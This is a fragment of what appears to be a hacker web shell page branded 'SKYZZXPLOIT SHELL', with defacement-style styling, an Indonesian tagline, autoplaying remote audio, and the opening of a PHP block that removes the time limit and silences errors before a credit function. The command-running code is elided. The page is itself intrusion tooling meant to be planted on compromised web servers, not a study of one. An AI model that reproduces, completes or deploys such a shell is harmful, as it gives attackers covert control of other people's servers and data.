...
<head>
	<title>SHELL BY SKYZZXPLOIT</title>
</head>
<style type="text/css">
body {
  overflow-x:hidden;
  font: 15px "Century Gothic", "Times Roman", sans-serif;
  background:url('https://b.top4top.io/p_3374g9c0c0.jpg');
background-image: url('https://b.top4top.io/p_3374g9c0c0.jpg');
...
<center>
<font face="Bungee" size="6">SKYZZXPLOIT SHELL</font></center>
<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr><td>
<center>
<title="SkyzzX" alt="OdayForums" class="center" />
</marquee>
            <hr>
        </font>
        <font face="Bungee" size="3">nikmatilah masa muda mu dengan ceria dan penuh cerita,bukan terluka karena cinta.</font></center><br><audio src="https://h.top4top.io/m_3349dl1j60.mp3" loop="1" controls="1" autoplay="1"></audio><br>
<br><br><br>
<?php
set_time_limit(0);
error_reporting(0);
...
function author() {
	echo "<center><br>COPYRIGHT B4GUSXPLOIT</center>";
	exit();
}
